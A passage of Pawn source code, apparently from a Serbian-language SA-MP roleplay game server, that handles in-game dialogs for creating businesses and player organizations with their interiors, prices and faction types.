				BussinesInfo[ IDFirme ][ bInInt ] = 0;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 0;
	    		BussinesInfo[ IDFirme ][ bExitY ] = 0;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 0;
			    BussinesInfo[ IDFirme ][ bPrice ] = 152364;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Promeni Ime!", 0, strlen( "Promeni Ime!" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_JFIRMA;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 5 ) { // Zip
				BussinesInfo[ IDFirme ][ bInInt ] = 18;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 161.410293;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -96.687202;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1001.804687;
			    BussinesInfo[ IDFirme ][ bPrice ] = 450000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Zip", 0, strlen( "Zip" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_ZIP;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 6 ) { // Victim
				BussinesInfo[ IDFirme ][ bInInt ] = 5;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 227.342803;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -8.243800;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1002.210876;
			    BussinesInfo[ IDFirme ][ bPrice ] = 450000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Victim", 0, strlen( "Victim" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_VICTIM;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 7 ) { // Suburban
				BussinesInfo[ IDFirme ][ bInInt ] = 1;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 203.895294;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -50.656700;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1001.804687;
			    BussinesInfo[ IDFirme ][ bPrice ] = 450000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Suburban", 0, strlen( "Suburban" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_SUBURBAN;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 8 ) { // Bar
				BussinesInfo[ IDFirme ][ bInInt ] = 11;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 501.870788;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -67.582000;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 998.757812;
			    BussinesInfo[ IDFirme ][ bPrice ] = 150000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Bar", 0, strlen( "Bar" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_BAR;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 9 ) { // Gym
				BussinesInfo[ IDFirme ][ bInInt ] = 5;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 772.359375;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -5.515697;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1000.728576;
			    BussinesInfo[ IDFirme ][ bPrice ] = 250000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Gym", 0, strlen( "Gym" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_GYM;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 10 ) { // Gun Shop
	            BussinesInfo[ IDFirme ][ bLevel ] = 10;
				BussinesInfo[ IDFirme ][ bInInt ] = 0;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 2036.6011;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -1883.5934;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 999.9080;
			    BussinesInfo[ IDFirme ][ bPrice ] = 1000000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Gun Shop", 0, strlen( "Gun Shop" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_GUNSHOP;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 11 ) { // MRestoran
				BussinesInfo[ IDFirme ][ bInInt ] = 4;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 460.265411;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -88.611503;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 999.554687;
			    BussinesInfo[ IDFirme ][ bPrice ] = 300000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Mali Restoran", 0, strlen( "Mali Restoran" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_RESTORAN;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 12 ) { // VRestoran
				BussinesInfo[ IDFirme ][ bInInt ] = 1;
	    		BussinesInfo[ IDFirme ][ bExitX ] = -794.850280;
	    		BussinesInfo[ IDFirme ][ bExitY ] = 489.279693;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1376.195312;
			    BussinesInfo[ IDFirme ][ bPrice ] = 350000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Veliki Restoran", 0, strlen( "Veliki Restoran" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_RESTORAN;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
			else if( vrsta == 13 ) { // Pizza
				BussinesInfo[ IDFirme ][ bInInt ] = 5;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 372.2682;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -133.5108;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1001.4922;
			    BussinesInfo[ IDFirme ][ bPrice ] = 750000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Well stacked pizza", 0, strlen( "Well stacked pizza" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_PIZZA;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 14 ) { // Nocni klub
				BussinesInfo[ IDFirme ][ bInInt ] = 3;
	    		BussinesInfo[ IDFirme ][ bExitX ] = -2636.5781;
	    		BussinesInfo[ IDFirme ][ bExitY ] = 1402.7936;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 906.4609;
			    BussinesInfo[ IDFirme ][ bPrice ] = 200000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Nocni klub", 0, strlen( "Nocni klub" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_NKLUB;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
			else if( vrsta == 15 ) { // Diskoteka
				BussinesInfo[ IDFirme ][ bInInt ] = 17;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 493.439300;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -24.916900;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1000.671875;
			    BussinesInfo[ IDFirme ][ bPrice ] = 200000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Diskoteka", 0, strlen( "Diskoteka" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_DISCO;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
            else if( vrsta == 22 ) { // Kladionica
                BussinesInfo[ IDFirme ][ bInInt ] = 0;
                BussinesInfo[ IDFirme ][ bExitX ] = 2377.3816;
                BussinesInfo[ IDFirme ][ bExitY ] = 2148.3079;
                BussinesInfo[ IDFirme ][ bExitZ ] = 1001.0859;
                BussinesInfo[ IDFirme ][ bPrice ] = 900000;
                strmid( BussinesInfo[ IDFirme ][ bName ], "Kladionica", 0, strlen( "Kladionica" ), 64);
                BussinesInfo[ IDFirme ][ bType ] = VRSTA_KLAD;
                BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
            else if( vrsta == 23) { //Prazan Lokal

                BussinesInfo[ IDFirme ][ bInInt ] = 0;
                BussinesInfo[ IDFirme ][ bExitX ] = 844.0661;
                BussinesInfo[ IDFirme ][ bExitY ] = 2105.3728;
                BussinesInfo[ IDFirme ][ bExitZ ] = -78.6360;
                BussinesInfo[ IDFirme ][ bPrice ] = 1;
                strmid( BussinesInfo[ IDFirme ][ bName ], "Prazan Lokal", 0, strlen( "Prazan Lokal" ), 64);
                BussinesInfo[ IDFirme ][ bType ] = VRSTA_PRAZANLOKAL;
                BussinesInfo[ IDFirme ][ bInVW ] = 0;
            }
            else if( vrsta == 24) { //Casino
                BussinesInfo[ IDFirme ][ bInInt ] = 0;
                BussinesInfo[ IDFirme ][ bExitX ] = 1141.3715;
                BussinesInfo[ IDFirme ][ bExitY ] = -50.7832;
                BussinesInfo[ IDFirme ][ bExitZ ] = 996.5208;
                BussinesInfo[ IDFirme ][ bPrice ] = 99999999;
                strmid( BussinesInfo[ IDFirme ][ bName ], "Casino", 0, strlen( "Casino" ), 64);
                BussinesInfo[ IDFirme ][ bType ] = VRSTA_CASINO;
                BussinesInfo[ IDFirme ][ bInVW ] = 0;
            }
		    BussinesInfo[ IDFirme ][ bMoney ] = 0;
		    BussinesInfo[ IDFirme ][ bInt ] = GetPlayerInterior( playerid );
		    BussinesInfo[ IDFirme ][ bProducts ] = 100;
		    BussinesInfo[ IDFirme ][ bNProducts ] = 0;
	    	BussinesInfo[ IDFirme ][ bPriceProdukta ] = 0;
	        BussinesInfo[ IDFirme ][ bVW ] = GetPlayerVirtualWorld( playerid );
	        strmid( BussinesInfo[ IDFirme ][ bOwner], "Drzava", 0, strlen( "Drzava" ), 32);
	        SaveBussines( IDFirme );
            if(BussinesInfo[IDFirme][bType] == VRSTA_PRAZANLOKAL) {

                format( f_string, sizeof( f_string), "{00DCF5}Lokal na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Adresa Lokala: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupilokal", IDFirme, UliceFirme( IDFirme ) );
                FirmaLabel[ IDFirme ] = CreateDynamic3DTextLabel( f_string, 0x33CCFFAA, PozX, PozY, PozZ, 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
                FirmaPickup[ IDFirme ] = CreateDynamicPickup( 1210, 1, PozX, PozY, PozZ ); Bussines_Refresh( IDFirme );
            }
            else {

    	        format( f_string, sizeof( f_string), "{00DCF5}Firma na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Ime : "col_white"%s\n{00DCF5}Cena Firme : "col_white"%d$\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Adresa Firme: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupifirmu", IDFirme, BussinesInfo[ IDFirme ][ bName ], BussinesInfo[ IDFirme ][ bPrice ], getBussinesType( IDFirme ), BussinesInfo[ IDFirme ][ bLevel ], UliceFirme( IDFirme ) );
    			FirmaLabel[ IDFirme ] = CreateDynamic3DTextLabel( f_string, 0x33CCFFAA, PozX, PozY, PozZ, 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
    			FirmaPickup[ IDFirme ] = CreateDynamicPickup( 1210, 1, PozX, PozY, PozZ ); Bussines_Refresh( IDFirme );
            }
			SendInfoMessage( playerid, "Uspesno si kreirao firmu." );
		}
	}
	else if( dialogid == dialog_ORGCREATE  ) {
	    if( response ) {
		    new ime[ ORG_IME ], fileorge[ 40 ], Float:PozX, Float:PozY, Float:PozZ;
		    GetPlayerPos( playerid, PozX, PozY, PozZ );
		    if(sscanf( inputtext, "s[64]", ime ) ) return SPD( playerid, dialog_ORGCREATE, DSI, D_NASLOV, "Unesite zeljeno ime vase organizacije!", D_ODABERI, D_NAZAD);
			for( new id = 1; id < MAX_ORG; id++ ) {
				format(fileorge, sizeof( fileorge ), O_FILE, id);
				if( !fexist( fileorge ) ) {
		            strmid(OI[ id ][ oName ], ime, 0, strlen(ime), ORG_IME);
					OI[ id ][oID] = id;

                    strmid( OI[ id ][ oLider1 ], "Niko", 0, strlen( "Niko" ), ORG_LIDER );
					strmid( OI[ id ][ oLider2 ], "Niko", 0, strlen( "Niko" ), ORG_LIDER );

					strmid( OI[ id ][ oClan1 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN );
					strmid( OI[ id ][ oClan10 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan11 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan12 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan13 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan14 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan15 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan16 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan17 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan18 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan19 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan20 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan21 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan22 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan23 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan24 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan25 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan26 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan27 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan28 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan29 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );
		            strmid( OI[ id ][ oClan30 ], "Niko", 0, strlen("Niko" ), ORG_CLAN );

		   			OI[ id ][oPozExtX] = PozX; OI[ id ][oPozExtY] = PozY; OI[ id ][oPozExtZ] = PozZ;

                    OI[id][oPobedjeniWar] = 0;
                    OI[id][oSavez] = 0;

                    OI[id][oSlabaTacka][0] = 0;
                    OI[id][oSlabaTacka][1] = 0;
                    OI[id][oSlabaTacka][2] = 0;
                    OI[id][oSlabaTackaProbijena] = false;
                    OI[id][oOrobano] = false;

					OrgKreiranje[ playerid ] = id;
					SaveOrganization( id) ;
					new string[ 256 ];
					format( string, sizeof( string ),""col_white"%s\n{FF6200}Za ulaz u interijer pritisnite\n"col_white"'ENTER'", OI[ id ][ oName ] );
					Org3D[ id ] = Create3DTextLabel( string, -1, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ], 25, 0, 1);
		        	OrgPickup[ id ] = CreateDynamicPickup(1314, 1, PozX, PozY, PozZ);
					SPD( playerid, dialog_ORGPREFIX, DSI, D_NASLOV, "Unesite skracenicu organizacije. Primer: LSPD", D_ODABERI, D_ODUSTANI );
					break;
				}
			}
		}
	}
	else if( dialogid == dialog_ORGPREFIX && response ) {
	    new id = GetNearestOrganization( playerid );
	    new prefix[ 10 ];
	    if( sscanf( inputtext, "s[10]", prefix ) ) return SPD( playerid, dialog_ORGPREFIX, DSI, D_NASLOV, "Unesite skracenicu organizacije. Primer: LSPD", D_ODABERI, D_ODUSTANI );
	    if( OrgKreiranje[ playerid ] == 0 ) {
	        strmid( OI[ id ][ oPreFix ], prefix, 0, strlen( prefix ), 10 );
	        SaveOrganization( id );
	        SendInfoMessage( playerid, "Uspesno ste promenili prefix organizacije!" );
		}
		else {
		    strmid( OI[ id ][ oPreFix ], prefix, 0, strlen( prefix ), 10 );
		    SaveOrganization( id );
		    SPD( playerid, dialog_ORGINT1, DSL, D_NASLOV, "Default Interior\nUnesi sam kordinate\nInterior bande\nInterior mafije\nInterior hitmana\nInterior taksista\nInterior bolnice\nInterior novinara\nInterior PD\nInteriror Mafija 2\nInterior Banda 2\nFBI Interior", D_ODABERI, D_ODUSTANI );
		}
	}
	else if( dialogid == dialog_ORGINT1 && response ) {
	    new id = GetNearestOrganization( playerid );
		if( listitem ==  0 ) {
	        if( OrgKreiranje[ playerid ] == 0 ) {
	            OI[ id ][ oPozIntX ] = 246.7840;
			 	OI[ id ][ oPozIntY ] = 63.9002;
			 	OI[ id ][ oPozIntZ ] = 1003.6406;
	         	OI[ id ][ oInt ] = 6;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili default interior!" ); }
			else {
		        OI[ id ][ oPozIntX ] = 246.7840;
			 	OI[ id ][ oPozIntY ] = 63.9002;
			 	OI[ id ][ oPozIntZ ] = 1003.6406;
	         	OI[ id ][ oInt ] = 6;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id );
	         	SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
			}
		}
	    if( listitem ==  1 ) {
	        SPD( playerid, dialog_ORGINT2, DSI, D_NASLOV, "Unesi id interiora i kordinate interiora\n Primer: 6 246.7840 63.9002 1003.6406", D_ODABERI, D_ODUSTANI );
		}
		if( listitem ==  2 ) {
	        if( OrgKreiranje[ playerid ] == 0 ) { 
	            OI[ id ][ oPozIntX ] = 193.9158;
			 	OI[ id ][ oPozIntY ] = 1260.2650;
			 	OI[ id ][ oPozIntZ ] = 1080.3502;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili banda interior!" );
	 		}
			else {
		        OI[ id ][ oPozIntX ] = 193.9158;
			 	OI[ id ][ oPozIntY ] = 1260.2650;
			 	OI[ id ][ oPozIntZ ] = 1080.3502;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id );
	         	SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
			}
		 }
		if( listitem ==  3 ) {
	        if( OrgKreiranje[ playerid ] == 0 ) {
	            OI[ id ][ oPozIntX ] = 2490.8872;
			 	OI[ id ][ oPozIntY ] = 1678.8401;
			 	OI[ id ][ oPozIntZ ] = -66.4837;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili mafija interior!" );
	 		}
			else {
		        OI[ id ][ oPozIntX ] = 2490.8872;
                OI[ id ][ oPozIntY ] = 1678.8401;
                OI[ id ][ oPozIntZ ] = -66.4837;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id );
	         	SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
			}
		}
		if( listitem ==  4 ) {
	        if( OrgKreiranje[ playerid ] == 0 ) {
	            OI[ id ][ oPozIntX ] = 390.7695;
			 	OI[ id ][ oPozIntY ] = 173.8225;
			 	OI[ id ][ oPozIntZ ] = 1008.3828;
	         	OI[ id ][ oInt ] = 3;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili hitman interior!" );
	 		}
			else {
		        OI[ id ][ oPozIntX ] = 390.7695;
			 	OI[ id ][ oPozIntY ] = 173.8225;
			 	OI[ id ][ oPozIntZ ] = 1008.3828;
	         	OI[ id ][ oInt ] = 3;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id );
	         	SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
			}
		}
		if( listitem == 5 ) { 
	        if( OrgKreiranje[ playerid ] == 0 ) { 
	            OI[ id ][ oPozIntX ] = 303.5256;
			 	OI[ id ][ oPozIntY ] = 1505.0259;
			 	OI[ id ][ oPozIntZ ] = -16.5524;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili taksista interior!" );
	 		}
			else {
		        OI[ id ][ oPozIntX ] = 303.5256;
			 	OI[ id ][ oPozIntY ] = 1505.0259;
			 	OI[ id ][ oPozIntZ ] = -16.5524;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id );
	         	SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
			}
		}
		if( listitem == 6 ) {
	        if( OrgKreiranje[ playerid ] == 0 ) { 
	            OI[ id ][ oPozIntX ] = -2330.1714;
			 	OI[ id ][ oPozIntY ] = 111.5213;
			 	OI[ id ][ oPozIntZ ] = -5.3942;
	         	OI[ id ][ oInt ] = 3;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili interior bolnice!" );
	 		}
			else {
		        OI[ id ][ oPozIntX ] = -2330.1714;
			 	OI[ id ][ oPozIntY ] = 111.5213;
			 	OI[ id ][ oPozIntZ ] = -5.3942;
	         	OI[ id ][ oInt ] = 3;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id );
	         	SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
			}
		}
		if( listitem == 7 ) {
	        if( OrgKreiranje[ playerid ] == 0 ) { 
	            OI[ id ][ oPozIntX ] = 224.9318;
			 	OI[ id ][ oPozIntY ] = 1134.8802;
			 	OI[ id ][ oPozIntZ ] = 459.2804;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili interior novinara!" );
	 		}
			else {
		        OI[ id ][ oPozIntX ] = 224.9318;
			 	OI[ id ][ oPozIntY ] = 1134.8802;
			 	OI[ id ][ oPozIntZ ] = 459.2804;
	         	OI[ id ][ oInt ] = 0;
	         	OI[ id ][ oVw ] = id;
	         	SaveOrganization( id );
	         	SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
			}
		}
        if(listitem == 8) {
            if( OrgKreiranje[ playerid ] == 0 ) {
                OI[ id ][ oPozIntX ] = 652.2396;
                OI[ id ][ oPozIntY ] = 2538.2920;
                OI[ id ][ oPozIntZ ] = -89.4551;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili interior policije!" );
            }
            else {
                OI[ id ][ oPozIntX ] = 652.2396;
                OI[ id ][ oPozIntY ] = 2538.2920;
                OI[ id ][ oPozIntZ ] = -89.4551;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id );
                SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
            }
        }
        if(listitem == 9) {

            if( OrgKreiranje[ playerid ] == 0 ) {
                OI[ id ][ oPozIntX ] = 1934.4063;
                OI[ id ][ oPozIntY ] = 280.0025;
                OI[ id ][ oPozIntZ ] = 1371.4218;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili interior mafija 2!" );
            }
            else {
                OI[ id ][ oPozIntX ] = 1934.4063;
                OI[ id ][ oPozIntY ] = 280.0025;
                OI[ id ][ oPozIntZ ] = 1371.4218;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id );
                SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
            }
        }

        if(listitem == 10) {

            if( OrgKreiranje[ playerid ] == 0 ) {
                OI[ id ][ oPozIntX ] = 291.2304;
                OI[ id ][ oPozIntY ] = -141.1451;
                OI[ id ][ oPozIntZ ] = 1161.2759;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili interior banda 2!" );
            }
            else {
                OI[ id ][ oPozIntX ] = 291.2304;
                OI[ id ][ oPozIntY ] = -141.1451;
                OI[ id ][ oPozIntZ ] = 1161.2759;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id );
                SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
            }
        }
        if(listitem == 11) {

            if( OrgKreiranje[ playerid ] == 0 ) {
                OI[ id ][ oPozIntX ] = -1464.9828;
                OI[ id ][ oPozIntY ] = 2609.3440;
                OI[ id ][ oPozIntZ ] = 19.6310;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id ); SendInfoMessage( playerid, "Uspesno ste stavili interior FBI!" );
            }
            else {
                OI[ id ][ oPozIntX ] = -1464.9828;
                OI[ id ][ oPozIntY ] = 2609.3440;
                OI[ id ][ oPozIntZ ] = 19.6310;
                OI[ id ][ oInt ] = 0;
                OI[ id ][ oVw ] = id;
                SaveOrganization( id );
                SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI );
            }
        }
	}
	else if( dialogid == dialog_ORGINT2 && response) {
	    new id = GetNearestOrganization( playerid );
	    new Float:Poz[ 3 ];
	    new intid;
		if( sscanf( inputtext, "ifff", intid, Poz[0], Poz[1], Poz[2] ) ) return SPD( playerid, dialog_ORGINT2, DSI, D_NASLOV, "Unesi id interiora i kordinate interiora\n Primer: 6 246.7840 63.9002 1003.6406", D_ODABERI, D_ODUSTANI );
	    if( OrgKreiranje[ playerid ] == 0 ) {
	    	OI[ id ][ oPozIntX ] = Poz[0];
		 	OI[ id ][ oPozIntY ] = Poz[1];
		 	OI[ id ][ oPozIntZ ] = Poz[2];
	   		OI[ id ][ oInt ] = intid;
	   		OI[ id ][ oVw ] = id;
	       	SaveOrganization( id ); SCM( playerid, CRVENA, "Uspesno ste promenili interior!" ); }
		else {
			OI[ id ][ oPozIntX ] = Poz[0];
		 	OI[ id ][ oPozIntY ] = Poz[1];
		 	OI[ id ][ oPozIntZ ] = Poz[2];
